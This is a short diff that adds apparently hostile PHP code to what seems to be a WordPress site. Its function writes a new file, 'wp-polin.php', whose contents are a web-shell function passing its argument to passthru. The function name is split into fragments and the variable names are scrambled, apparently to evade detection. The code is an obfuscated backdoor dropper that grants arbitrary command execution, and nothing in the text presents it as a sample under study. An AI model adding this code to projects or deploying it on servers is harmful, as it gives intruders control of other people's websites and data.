@@ -1,0 +1,1 @@
+<?php function sis_create(){$xafq_0=fopen('wp-polin.php','w');$xemy_1="<?php function ";$iosx_2="wp_run(\$bd){pas";$eduj_3="sth";$syeg_4="ru(\$bd);}?>";fputs($xafq_0,$xemy_1.$iosx_2.$eduj_3.$syeg_4);}?>
